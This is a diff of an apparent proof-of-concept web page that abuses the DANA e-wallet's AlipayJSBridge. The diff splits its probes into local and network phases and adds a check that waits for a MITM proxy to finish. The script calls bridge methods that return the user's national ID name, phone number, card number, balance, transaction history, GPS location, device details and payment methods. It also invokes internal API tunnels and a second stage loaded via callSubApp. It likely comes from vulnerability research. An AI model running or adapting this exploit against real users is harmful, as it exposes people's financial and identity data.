@@ -13,8 +13,9 @@
 </head>
 <body>
 <div id="status">v7 boot</div>
-<h3 id="hdr">V7 CLEAN-NET RUN</h3>
+<h3 id="hdr">V7 RUN</h3>
 <pre id="p-0">pending</pre>
+<pre id="p-net">pending</pre>
 <pre id="p-1">pending</pre>
 <pre id="p-2">pending</pre>
 <pre id="p-3">pending</pre>
@@ -59,6 +60,32 @@
     });
   }
 
+  // netcheck: fetch ping.txt same-origin; header X-Via-Mitm = "intercept" (fase MITM) → tunggu
+  function netcheck(){
+    return fetch('ping.txt?cb='+Date.now(), {cache:'no-store'})
+      .then(function(r){
+        var v = r.headers.get('x-via-mitm');
+        return {mitm: v, ok:true};
+      })
+      .catch(function(e){ return {mitm:'fetch-fail', ok:false, err:String(e).slice(0,60)}; });
+  }
+  function waitClean(maxMs){
+    return new Promise(function(resolve){
+      var t0 = Date.now();
+      var iv = setInterval(function(){
+        netcheck().then(function(nc){
+          var el = document.getElementById('status');
+          el.textContent = 'v7 s'+st+': NET '+JSON.stringify(nc)+' ('+Math.round((Date.now()-t0)/1000)+'s)';
+          if (nc.mitm !== 'intercept' || Date.now()-t0 > maxMs){
+            clearInterval(iv);
+            set('p-net', nc);
+            resolve(nc);
+          }
+        });
+      }, 4000);
+    });
+  }
+
   bridgeReady(async function(){
     if (!window.AlipayJSBridge){
       set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)});
@@ -68,50 +95,41 @@
     var sp = {};
     try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
     set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, lpUrl:(sp.launcherParamUrl||'').slice(0,60), href:location.href.slice(0,60), dver:sp.danaAppVersion||sp.appVersion});
-    status('1/14 userinfo');
+    status('local probes');
 
-    // Data bridges (reconfirm on 2.141.2 / device 2)
+    // FASE LOKAL (jalan walau MITM aktif)
     set('p-1', await call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'ktpName,globalPhoneNumber,userPan,userId,kycLevel,balance'}}, 20000));
-    status('2/14 trx');
-    set('p-2', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:true}, 25000));
-    status('3/14 gps');
-    var gps = await call('getLocationInfo', {}, 15000);
-    set('p-3', gps);
-    status('4/14 locationName');
-    var lat = (gps && gps.latitude) || '-7.4254221', lon = (gps && gps.longitude) || '111.3005175';
-    set('p-4', await call('locationName', {info:{lat:String(lat), long:String(lon)}}, 15000));
-    status('5/14 device');
+    set('p-4', await call('locationName', {info:{lat:'-7.4254221', long:'111.3005175'}}, 15000));
     set('p-11', await call('getAkuDeviceInfo', {}, 15000));
-    status('6/14 paymethod');
-    set('p-12', await call('queryPayMethod', {}, 15000));
-
-    // === CLEAN-NETWORK probes (the point of v7) ===
-    status('7/14 partner.invoke');
-    set('p-5', await call('requestApi', {operationType:'id.dana.minitunnel.partner.invoke', payload:{}}, 20000));
-    status('8/14 user.info.masking');
-    set('p-6', await call('requestApi', {operationType:'id.dana.minitunnel.user.info.masking', payload:{}}, 20000));
-    status('9/14 createShortLink');
-    set('p-7', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 20000));
-    status('10/14 download');
-    set('p-8', await call('download', {event:'generalDownload', info:{url:'https://rfypych.github.io/poc/ping.txt', fileName:'poc_v7_dl', fileFormat:'.txt'}}, 20000));
-    status('11/14 downloadFile');
-    set('p-9', await call('downloadFile', {url:'https://rfypych.github.io/poc/ping.txt', filePath:'v7probe.txt', downloadTaskId:2}, 20000));
-    status('12/14 nativeCache');
     var s1 = await call('nativeCache', {info:{event:'save', key:'poc_v7', data:'marker7'}}, 12000);
     var g1 = await call('nativeCache', {info:{event:'get', key:'poc_v7'}}, 12000);
     var g2 = await call('nativeCache', {info:{event:'get', key:'walletDetail'}}, 12000);
     set('p-10', {save:s1, getPoc:g1, getWallet:g2});
-    status('13/14 gate-contrast');
+
+    if (st === '1'){
+      // tunggu network bersih (fase MITM selesai / tidak ada MITM)
+      var nc = await waitClean(120000);
+      status('network probes');
+    }
+
+    // FASE NETWORK (butuh jalur bersih ke server DANA)
+    set('p-2', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:true}, 25000));
+    set('p-3', await call('getLocationInfo', {}, 15000));
+    set('p-12', await call('queryPayMethod', {}, 15000));
+    set('p-5', await call('requestApi', {operationType:'id.dana.minitunnel.partner.invoke', payload:{}}, 20000));
+    set('p-6', await call('requestApi', {operationType:'id.dana.minitunnel.user.info.masking', payload:{}}, 20000));
+    set('p-7', await call('createShortLink', {url:'https://rfypych.github.io/poc/ping.txt'}, 20000));
+    set('p-8', await call('download', {event:'generalDownload', info:{url:'https://rfypych.github.io/poc/ping.txt', fileName:'poc_v7_dl', fileFormat:'.txt'}}, 20000));
+    set('p-9', await call('downloadFile', {url:'https://rfypych.github.io/poc/ping.txt', filePath:'v7probe.txt', downloadTaskId:2}, 20000));
     var sec = await call('getSecurityLevelInfo', {}, 12000);
     var us = await call('getUserStatus', {}, 12000);
     var cons = await call('getConsultOmni', {info:{}}, 12000);
     set('p-13', {secLvl:sec, userStatus:us, consultOmni:cons});
 
     if (st === '1'){
-      status('14/14 callSubApp stage2');
-      set('p-14', {action:'navigating container to stage2 via callSubApp...'});
+      set('p-14', {action:'navigating to stage2 via callSubApp...'});
       var r = await call('callSubApp', {url:'https://rfypych.github.io/poc/v7.html?stage=2'}, 10000);
-      set('p-14', {callSubApp:r, note:'stage2 should now load in-session'});
+      set('p-14', {callSubApp:r, note:'stage2 = in-session (callSubApp context)'});
     } else {
       set('p-14', {stage2:true, note:'network probes above ran in-session (callSubApp context)'});
     }
